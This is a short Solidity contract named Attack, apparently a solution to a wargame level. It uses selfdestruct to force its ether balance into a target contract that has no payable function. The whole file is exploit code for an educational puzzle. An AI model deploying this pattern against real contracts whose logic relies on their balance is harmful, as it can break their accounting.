// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    address public force;

    constructor(address _force){
        force = _force;
    }

    function charaa() public payable {}

    function attack() public {
        selfdestruct(payable(force));
    }
    
}